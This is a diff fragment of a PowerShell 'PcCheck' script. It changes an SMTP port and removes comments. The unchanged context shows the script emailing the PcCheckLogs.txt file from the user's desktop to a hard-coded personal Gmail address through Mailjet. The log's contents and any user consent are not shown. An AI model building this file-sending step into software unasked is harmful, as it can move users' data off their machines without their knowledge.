@@ -275,15 +275,13 @@ function Main {
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
 $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
 
-# Define email parameters
 $smtpServer = "smtp.mailjet.com"   
-$smtpPort = 587                                
+$smtpPort = 465                                
 $fromAddress = "andrew.p.sherman21@gmail.com"        
 $toAddress = "andrew.p.sherman21@gmail.com"     
 $subject = "PcCheck Log File"
 $body = "Please find attached the PcCheckLogs.txt file."
 
-# Check if the file exists and send email
 if (Test-Path $logFilePath) {
     $attachment = New-Object Net.Mail.Attachment($logFilePath)
     $message = New-Object Net.Mail.MailMessage
@@ -305,7 +303,6 @@ if (Test-Path $logFilePath) {
         Write-Host "Failed to send email: $_" -ForegroundColor Red
     }
 
-    # Dispose of attachment after sending
     $attachment.Dispose()
 } else {
     Write-Host "Log file not found on the desktop." -ForegroundColor Red
